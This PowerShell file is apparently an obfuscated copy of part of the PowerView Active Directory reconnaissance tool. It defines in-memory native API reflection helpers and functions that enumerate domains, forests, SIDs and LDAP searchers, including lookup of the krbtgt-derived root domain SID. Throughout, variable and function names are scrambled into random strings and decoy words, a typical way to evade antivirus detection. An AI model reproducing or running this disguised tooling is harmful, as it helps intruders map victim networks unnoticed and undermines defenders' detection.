function pap
{
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )
    $MuGhHiDn99 = [AppDomain]::CurrentDomain.GetAssemblies()
    ForEach ($eFQKfxPL99 in $MuGhHiDn99) {
        if ($eFQKfxPL99.FullName -and ($eFQKfxPL99.FullName.Split(',')[0] -eq $ModuleName)) {
            return $eFQKfxPL99
        }
    }
    $ulFlfIfk99 = New-Object Reflection.AssemblyName($ModuleName)
    $qgkPCptv99 = [AppDomain]::CurrentDomain
    $UCNiSoRa99 = $qgkPCptv99.DefineDynamicAssembly($ulFlfIfk99, 'Run')
    $WRYTufFZ99 = $UCNiSoRa99.DefineDynamicModule($ModuleName, $False)
    return $WRYTufFZ99
}
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FunctionName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,
        [Switch]
        $SetLastError
    )
    $MzRFScgm99 = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $MzRFScgm99['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $MzRFScgm99['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $MzRFScgm99['Charset'] = $Charset }
    if ($SetLastError) { $MzRFScgm99['SetLastError'] = $SetLastError }
    New-Object PSObject -Property $MzRFScgm99
}
function Abel
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,
        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    BEGIN
    {
        $nkOquHjn99 = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $nkOquHjn99[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $nkOquHjn99[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$nkOquHjn99.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $nkOquHjn99[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $nkOquHjn99[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }
            $qfkbdDyn99 = $nkOquHjn99[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)
            $i = 1
            ForEach($IxAUkTCK99 in $ParameterTypes)
            {
                if ($IxAUkTCK99.IsByRef)
                {
                    [void] $qfkbdDyn99.DefineParameter($i, 'Out', $Null)
                }
                $i++
            }
            $TNUylxsd99 = [Runtime.InteropServices.DllImportAttribute]
            $IVNfbDeS99 = $TNUylxsd99.GetField('SetLastError')
            $AZqtCdZS99 = $TNUylxsd99.GetField('CallingConvention')
            $WNUuuLfR99 = $TNUylxsd99.GetField('CharSet')
            if ($SetLastError) { $baRJKxUM99 = $True } else { $baRJKxUM99 = $False }
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $zdQWQFEe99 = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($IVNfbDeS99, $AZqtCdZS99, $WNUuuLfR99),
                [Object[]] @($baRJKxUM99, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))
            $qfkbdDyn99.SetCustomAttribute($zdQWQFEe99)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $nkOquHjn99
        }
        $PnRQrTgf99 = @{}
        ForEach ($Key in $nkOquHjn99.Keys)
        {
            $Type = $nkOquHjn99[$Key].CreateType()
            $PnRQrTgf99[$Key] = $Type
        }
        return $PnRQrTgf99
    }
}
function misappropriation
{
    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $RaLOBFMc99,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,
        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $eJgceylr99,
        [Switch]
        $Bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($RaLOBFMc99))
    }
    $ljqrQlUN99 = $Type -as [Type]
    $GbVBQwhQ99 = $Module.DefineEnum($RaLOBFMc99, 'Public', $ljqrQlUN99)
    if ($Bitfield)
    {
        $lJNqNGsK99 = [FlagsAttribute].GetConstructor(@())
        $EAwGjTRF99 = New-Object Reflection.Emit.CustomAttributeBuilder($lJNqNGsK99, @())
        $GbVBQwhQ99.SetCustomAttribute($EAwGjTRF99)
    }
    ForEach ($Key in $eJgceylr99.Keys)
    {
        $Null = $GbVBQwhQ99.DefineLiteral($Key, $eJgceylr99[$Key] -as $ljqrQlUN99)
    }
    $GbVBQwhQ99.CreateType()
}
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $ItpWdHHT99,
        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,
        [Parameter(Position = 2)]
        [UInt16]
        $vBrKvGZT99,
        [Object[]]
        $MarshalAs
    )
    @{
        Position = $ItpWdHHT99
        Type = $Type -as [Type]
        Offset = $vBrKvGZT99
        MarshalAs = $MarshalAs
    }
}
function Brillo
{
    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $RaLOBFMc99,
        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $MGPvULOu99,
        [Reflection.Emit.PackingSize]
        $qUyMwjFq99 = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $Atgkqftq99
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($RaLOBFMc99))
    }
    [Reflection.TypeAttributes] $nkuYQnKg99 = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'
    if ($Atgkqftq99)
    {
        $nkuYQnKg99 = $nkuYQnKg99 -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $nkuYQnKg99 = $nkuYQnKg99 -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    $OVHzTWsR99 = $Module.DefineType($RaLOBFMc99, $nkuYQnKg99, [ValueType], $qUyMwjFq99)
    $WJXxwncm99 = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $vebnxMbv99 = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    $eENHtVbb99 = New-Object Hashtable[]($MGPvULOu99.Count)
    ForEach ($Field in $MGPvULOu99.Keys)
    {
        $Index = $MGPvULOu99[$Field]['Position']
        $eENHtVbb99[$Index] = @{FieldName = $Field; Properties = $MGPvULOu99[$Field]}
    }
    ForEach ($Field in $eENHtVbb99)
    {
        $KLqXyIrT99 = $Field['FieldName']
        $wgAKgBuS99 = $Field['Properties']
        $vBrKvGZT99 = $wgAKgBuS99['Offset']
        $Type = $wgAKgBuS99['Type']
        $MarshalAs = $wgAKgBuS99['MarshalAs']
        $LlUVeeSX99 = $OVHzTWsR99.DefineField($KLqXyIrT99, $Type, 'Public')
        if ($MarshalAs)
        {
            $faHbYmJu99 = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $lTYXFBeL99 = New-Object Reflection.Emit.CustomAttributeBuilder($WJXxwncm99,
                    $faHbYmJu99, $vebnxMbv99, @($Size))
            }
            else
            {
                $lTYXFBeL99 = New-Object Reflection.Emit.CustomAttributeBuilder($WJXxwncm99, [Object[]] @($faHbYmJu99))
            }
            $LlUVeeSX99.SetCustomAttribute($lTYXFBeL99)
        }
        if ($Atgkqftq99) { $LlUVeeSX99.SetOffset($vBrKvGZT99) }
    }
    $utnoXZsc99 = $OVHzTWsR99.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $TCQSPyxM99 = $utnoXZsc99.GetILGenerator()
    $TCQSPyxM99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $OVHzTWsR99)
    $TCQSPyxM99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $TCQSPyxM99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $TCQSPyxM99.Emit([Reflection.Emit.OpCodes]::Ret)
    $uufPUGDn99 = $OVHzTWsR99.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $OVHzTWsR99,
        [Type[]] @([IntPtr]))
    $skukfohR99 = $uufPUGDn99.GetILGenerator()
    $skukfohR99.Emit([Reflection.Emit.OpCodes]::Nop)
    $skukfohR99.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $skukfohR99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $OVHzTWsR99)
    $skukfohR99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $skukfohR99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $skukfohR99.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $OVHzTWsR99)
    $skukfohR99.Emit([Reflection.Emit.OpCodes]::Ret)
    $OVHzTWsR99.CreateType()
}
filter Get-IniContent {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('FullName')]
        [ValidateScript({ Test-Path -Path $_ })]
        [String[]]
        $Path
    )
    ForEach($sXgQNBQP99 in $Path) {
        $heeydDsH99 = @{}
        Switch -Regex -File $sXgQNBQP99 {
            "^\[(.+)\]" # Section
            {
                $jLibZRxZ99 = $matches[1].Trim()
                $heeydDsH99[$jLibZRxZ99] = @{}
                $HgAvFHLX99 = 0
            }
            "^(;.*)$" # Comment
            {
                $Value = $matches[1].Trim()
                $HgAvFHLX99 = $HgAvFHLX99 + 1
                $Name = 'Comment' + $HgAvFHLX99
                $heeydDsH99[$jLibZRxZ99][$Name] = $Value
            }
            "(.+?)\s*=(.*)" # Key
            {
                $Name, $Value = $matches[1..2]
                $Name = $Name.Trim()
                $ZpUfODcB99 = $Value.split(',') | ForEach-Object {$_.Trim()}
                if($ZpUfODcB99 -isnot [System.Array]) {$ZpUfODcB99 = @($ZpUfODcB99)}
                $heeydDsH99[$jLibZRxZ99][$Name] = $ZpUfODcB99
            }
        }
        $heeydDsH99
    }
}
filter Get-IPAddress {
    [CmdletBinding()]
    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $FSUaYgqW99 = $Env:ComputerName
    )
    try {
        $cAqMfgab99 = $FSUaYgqW99 | Get-NameField
        @(([Net.Dns]::GetHostEntry($cAqMfgab99)).AddressList) | ForEach-Object {
            if ($_.AddressFamily -eq 'InterNetwork') {
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ComputerName' $cAqMfgab99
                $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                $Out
            }
        }
    }
    catch {
        Write-Verbose -Message 'Could not resolve host to an IP Address.'
    }
}
filter Convert-NameToSid {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        [Alias('Name')]
        $QdVkYekP99,
        [String]
        $qgkPCptv99
    )
    $QdVkYekP99 = $QdVkYekP99 -Replace "/","\"
    if($QdVkYekP99.Contains("\")) {
        $qgkPCptv99 = $QdVkYekP99.Split("\")[0]
        $QdVkYekP99 = $QdVkYekP99.Split("\")[1]
    }
    elseif(-not $qgkPCptv99) {
        $qgkPCptv99 = (Get-NetDomain).Name
    }
    try {
        $Obj = (New-Object System.Security.Principal.NTAccount($qgkPCptv99, $QdVkYekP99))
        $SID = $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ObjectName' $QdVkYekP99
        $Out | Add-Member Noteproperty 'SID' $SID
        $Out
    }
    catch {
        Write-Verbose "Invalid object/name: $qgkPCptv99\$QdVkYekP99"
        $Null
    }
}
filter Convert-SidToName {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        [ValidatePattern('^S-1-.*')]
        $SID
    )
    try {
        $SID2 = $SID.trim('*')
        Switch ($SID2) {
            'S-1-0'         { 'Null Authority' }
            'S-1-0-0'       { 'Nobody' }
            'S-1-1'         { 'World Authority' }
            'S-1-1-0'       { 'Everyone' }
            'S-1-2'         { 'Local Authority' }
            'S-1-2-0'       { 'Local' }
            'S-1-2-1'       { 'Console Logon ' }
            'S-1-3'         { 'Creator Authority' }
            'S-1-3-0'       { 'Creator Owner' }
            'S-1-3-1'       { 'Creator Group' }
            'S-1-3-2'       { 'Creator Owner Server' }
            'S-1-3-3'       { 'Creator Group Server' }
            'S-1-3-4'       { 'Owner Rights' }
            'S-1-4'         { 'Non-unique Authority' }
            'S-1-5'         { 'NT Authority' }
            'S-1-5-1'       { 'Dialup' }
            'S-1-5-2'       { 'Network' }
            'S-1-5-3'       { 'Batch' }
            'S-1-5-4'       { 'Interactive' }
            'S-1-5-6'       { 'Service' }
            'S-1-5-7'       { 'Anonymous' }
            'S-1-5-8'       { 'Proxy' }
            'S-1-5-9'       { 'Enterprise Domain Controllers' }
            'S-1-5-10'      { 'Principal Self' }
            'S-1-5-11'      { 'Authenticated Users' }
            'S-1-5-12'      { 'Restricted Code' }
            'S-1-5-13'      { 'Terminal Server Users' }
            'S-1-5-14'      { 'Remote Interactive Logon' }
            'S-1-5-15'      { 'This Organization ' }
            'S-1-5-17'      { 'This Organization ' }
            'S-1-5-18'      { 'Local System' }
            'S-1-5-19'      { 'NT Authority' }
            'S-1-5-20'      { 'NT Authority' }
            'S-1-5-80-0'    { 'All Services ' }
            'S-1-5-32-544'  { 'BUILTIN\Administrators' }
            'S-1-5-32-545'  { 'BUILTIN\Users' }
            'S-1-5-32-546'  { 'BUILTIN\Guests' }
            'S-1-5-32-547'  { 'BUILTIN\Power Users' }
            'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
            'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
            'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
            'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
            'S-1-5-32-552'  { 'BUILTIN\Replicators' }
            'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
            'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
            'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
            'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
            'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
            'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
            'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
            'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
            'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
            'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
            'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
            'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
            'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
            'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
            'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
            'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
            'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
            'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
            Default {
                $Obj = (New-Object System.Security.Principal.SecurityIdentifier($SID2))
                $Obj.Translate( [System.Security.Principal.NTAccount]).Value
            }
        }
    }
    catch {
        Write-Verbose "Invalid SID: $SID"
        $SID
    }
}
filter Convert-ADName {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $QdVkYekP99,
        [String]
        [ValidateSet("NT4","DN","Simple","Canonical")]
        $QwuuysVC99,
        [String]
        [ValidateSet("NT4","DN","Simple","Canonical")]
        $bevdxAcf99
    )
    $UDACMcFX99 = @{
        'DN'        = 1
        'Canonical' = 2
        'NT4'       = 3
        'Simple'    = 5
    }
    if(-not $PSBoundParameters['InputType']) {
        if( ($QdVkYekP99.split('/')).Count -eq 2 ) {
            $QdVkYekP99 = $QdVkYekP99.replace('/', '\')
        }
        if($QdVkYekP99 -match "^[A-Za-z]+\\[A-Za-z ]+") {
            $QwuuysVC99 = 'NT4'
        }
        elseif($QdVkYekP99 -match "^[A-Za-z ]+@[A-Za-z\.]+") {
            $QwuuysVC99 = 'Simple'
        }
        elseif($QdVkYekP99 -match "^[A-Za-z\.]+/[A-Za-z]+/[A-Za-z/ ]+") {
            $QwuuysVC99 = 'Canonical'
        }
        elseif($QdVkYekP99 -match '^CN=.*') {
            $QwuuysVC99 = 'DN'
        }
        else {
            Write-Warning "Can not identify InType for $QdVkYekP99"
        }
    }
    elseif($QwuuysVC99 -eq 'NT4') {
        $QdVkYekP99 = $QdVkYekP99.replace('/', '\')
    }
    if(-not $PSBoundParameters['OutputType']) {
        $bevdxAcf99 = Switch($QwuuysVC99) {
            'NT4' {'Canonical'}
            'Simple' {'NT4'}
            'DN' {'NT4'}
            'Canonical' {'NT4'}
        }
    }
    $qgkPCptv99 = Switch($QwuuysVC99) {
        'NT4' { $QdVkYekP99.split("\")[0] }
        'Simple' { $QdVkYekP99.split("@")[1] }
        'Canonical' { $QdVkYekP99.split("/")[0] }
        'DN' {$QdVkYekP99.subString($QdVkYekP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'}
    }
    function Invoke-Method([__ComObject] $Object, [String] $qfkbdDyn99, $OKRatsTq99) {
        $lSWjiHrd99 = $Object.GetType().InvokeMember($qfkbdDyn99, "InvokeMethod", $Null, $Object, $OKRatsTq99)
        if ( $lSWjiHrd99 ) { $lSWjiHrd99 }
    }
    function Set-Property([__ComObject] $Object, [String] $HpsmjkaN99, $OKRatsTq99) {
        [Void] $Object.GetType().InvokeMember($HpsmjkaN99, "SetProperty", $Null, $Object, $OKRatsTq99)
    }
    $aYbYDQss99 = New-Object -ComObject NameTranslate
    try {
        Invoke-Method $aYbYDQss99 "Init" (1, $qgkPCptv99)
    }
    catch [System.Management.Automation.MethodInvocationException] {
    }
    Set-Property $aYbYDQss99 "ChaseReferral" (0x60)
    try {
        Invoke-Method $aYbYDQss99 "Set" ($UDACMcFX99[$QwuuysVC99], $QdVkYekP99)
        (Invoke-Method $aYbYDQss99 "Get" ($UDACMcFX99[$bevdxAcf99]))
    }
    catch [System.Management.Automation.MethodInvocationException] {
    }
}
filter Get-NameField {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Object]
        $Object,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        $VsIMaNnX99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        $Name
    )
    if($PSBoundParameters['DnsHostName']) {
        $VsIMaNnX99
    }
    elseif($PSBoundParameters['Name']) {
        $Name
    }
    elseif($Object) {
        if ( [bool]($Object.PSobject.Properties.name -match "dnshostname") ) {
            $Object.dnshostname
        }
        elseif ( [bool]($Object.PSobject.Properties.name -match "name") ) {
            $Object.name
        }
        else {
            $Object
        }
    }
    else {
        return $Null
    }
}
function intemperance {
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        $MzRFScgm99
    )
    $cikotvLW99 = @{}
    $MzRFScgm99.PropertyNames | ForEach-Object {
        if (($_ -eq "objectsid") -or ($_ -eq "sidhistory")) {
            $cikotvLW99[$_] = (New-Object System.Security.Principal.SecurityIdentifier($MzRFScgm99[$_][0],0)).Value
        }
        elseif($_ -eq "objectguid") {
            $cikotvLW99[$_] = (New-Object Guid (,$MzRFScgm99[$_][0])).Guid
        }
        elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") -or ($_ -eq "lastlogoff") -or ($_ -eq "badPasswordTime") ) {
            if ($MzRFScgm99[$_][0] -is [System.MarshalByRefObject]) {
                $Temp = $MzRFScgm99[$_][0]
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $cikotvLW99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
            }
            else {
                $cikotvLW99[$_] = ([datetime]::FromFileTime(($MzRFScgm99[$_][0])))
            }
        }
        elseif($MzRFScgm99[$_][0] -is [System.MarshalByRefObject]) {
            $Prop = $MzRFScgm99[$_]
            try {
                $Temp = $Prop[$_][0]
                Write-Verbose $_
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $cikotvLW99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
            }
            catch {
                $cikotvLW99[$_] = $Prop[$_]
            }
        }
        elseif($MzRFScgm99[$_].count -eq 1) {
            $cikotvLW99[$_] = $MzRFScgm99[$_][0]
        }
        else {
            $cikotvLW99[$_] = $MzRFScgm99[$_]
        }
    }
    New-Object -TypeName PSObject -Property $cikotvLW99
}
filter Get-DomainSearcher {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $qgkPCptv99,
        [String]
        $wjlQGPFM99,
        [String]
        $CDwHFsqK99,
        [String]
        $cYIswHDZ99,
        [ValidateRange(1,10000)]
        [Int]
        $XHaombgH99 = 200,
        [Management.Automation.PSCredential]
        $elChyFUc99
    )
    if(-not $elChyFUc99) {
        if(-not $qgkPCptv99) {
            $qgkPCptv99 = (Get-NetDomain).name
        }
        elseif(-not $wjlQGPFM99) {
            try {
                $wjlQGPFM99 = ((Get-NetDomain).PdcRoleOwner).Name
            }
            catch {
                throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
            }
        }
    }
    elseif (-not $wjlQGPFM99) {
        try {
            $wjlQGPFM99 = ((Get-NetDomain -elChyFUc99 $elChyFUc99).PdcRoleOwner).Name
        }
        catch {
            throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
        }
        if(!$wjlQGPFM99) {
            throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
        }
    }
    $HGlUTmdw99 = "LDAP://"
    if($wjlQGPFM99) {
        $HGlUTmdw99 += $wjlQGPFM99
        if($qgkPCptv99){
            $HGlUTmdw99 += '/'
        }
    }
    if($cYIswHDZ99) {
        $HGlUTmdw99 += $cYIswHDZ99 + ','
    }
    if($CDwHFsqK99) {
        if($CDwHFsqK99 -Match '^GC://') {
            $DN = $CDwHFsqK99.ToUpper().Trim('/')
            $HGlUTmdw99 = ''
        }
        else {
            if($CDwHFsqK99 -match '^LDAP://') {
                if($CDwHFsqK99 -match "LDAP://.+/.+") {
                    $HGlUTmdw99 = ''
                }
                else {
                    $CDwHFsqK99 = $CDwHFsqK99.Substring(7)
                }
            }
            $DN = $CDwHFsqK99
        }
    }
    else {
        if($qgkPCptv99 -and ($qgkPCptv99.Trim() -ne "")) {
            $DN = "DC=$($qgkPCptv99.Replace('.', ',DC='))"
        }
    }
    $HGlUTmdw99 += $DN
    Write-Verbose "Get-DomainSearcher search string: $HGlUTmdw99"
    if($elChyFUc99) {
        Write-Verbose "Using alternate credentials for LDAP connection"
        $rwZQXSLF99 = New-Object DirectoryServices.DirectoryEntry($HGlUTmdw99, $elChyFUc99.UserName, $elChyFUc99.GetNetworkCredential().Password)
        $BIJCfhwC99 = New-Object System.DirectoryServices.DirectorySearcher($rwZQXSLF99)
    }
    else {
        $BIJCfhwC99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$HGlUTmdw99)
    }
    $BIJCfhwC99.PageSize = $XHaombgH99
    $BIJCfhwC99.CacheResults = $False
    $BIJCfhwC99
}
filter Get-NetDomain {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $qgkPCptv99,
        [Management.Automation.PSCredential]
        $elChyFUc99
    )
    if($elChyFUc99) {
        Write-Verbose "Using alternate credentials for Get-NetDomain"
        if(!$qgkPCptv99) {
            $qgkPCptv99 = $elChyFUc99.GetNetworkCredential().Domain
            Write-Verbose "Extracted domain '$qgkPCptv99' from -elChyFUc99"
        }
        $LGXYXLbp99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $qgkPCptv99, $elChyFUc99.UserName, $elChyFUc99.GetNetworkCredential().Password)
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($LGXYXLbp99)
        }
        catch {
            Write-Verbose "The specified domain does '$qgkPCptv99' not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid."
            $Null
        }
    }
    elseif($qgkPCptv99) {
        $LGXYXLbp99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $qgkPCptv99)
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($LGXYXLbp99)
        }
        catch {
            Write-Verbose "The specified domain '$qgkPCptv99' does not exist, could not be contacted, or there isn't an existing trust."
            $Null
        }
    }
    else {
        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    }
}
filter Get-NetForest {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $CsVkrBsu99,
        [Management.Automation.PSCredential]
        $elChyFUc99
    )
    if($elChyFUc99) {
        Write-Verbose "Using alternate credentials for Get-NetForest"
        if(!$CsVkrBsu99) {
            $CsVkrBsu99 = $elChyFUc99.GetNetworkCredential().Domain
            Write-Verbose "Extracted domain '$CsVkrBsu99' from -elChyFUc99"
        }
        $vDtRSTTs99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $CsVkrBsu99, $elChyFUc99.UserName, $elChyFUc99.GetNetworkCredential().Password)
        try {
            $SPlrjVSC99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($vDtRSTTs99)
        }
        catch {
            Write-Verbose "The specified forest '$CsVkrBsu99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid."
            $Null
        }
    }
    elseif($CsVkrBsu99) {
        $vDtRSTTs99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $CsVkrBsu99)
        try {
            $SPlrjVSC99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($vDtRSTTs99)
        }
        catch {
            Write-Verbose "The specified forest '$CsVkrBsu99' does not exist, could not be contacted, or there isn't an existing trust."
            return $Null
        }
    }
    else {
        $SPlrjVSC99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    }
    if($SPlrjVSC99) {
        $TFnRdESD99 = (New-Object System.Security.Principal.NTAccount($SPlrjVSC99.RootDomain,"krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
        $Parts = $TFnRdESD99 -Split "-"
        $TFnRdESD99 = $Parts[0..$($Parts.length-2)] -join "-"
        $SPlrjVSC99 | Add-Member NoteProperty 'RootDomainSid' $TFnRdESD99
        $SPlrjVSC99
    }
}
filter Get-NetForestDomain {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $CsVkrBsu99,
        [Management.Automation.PSCredential]
        $elChyFUc99
    )
    $SPlrjVSC99 = Get-NetForest -CsVkrBsu99 $CsVkrBsu99 -elChyFUc99 $elChyFUc99
    if($SPlrjVSC99) {
        $SPlrjVSC99.Domains
    }
}
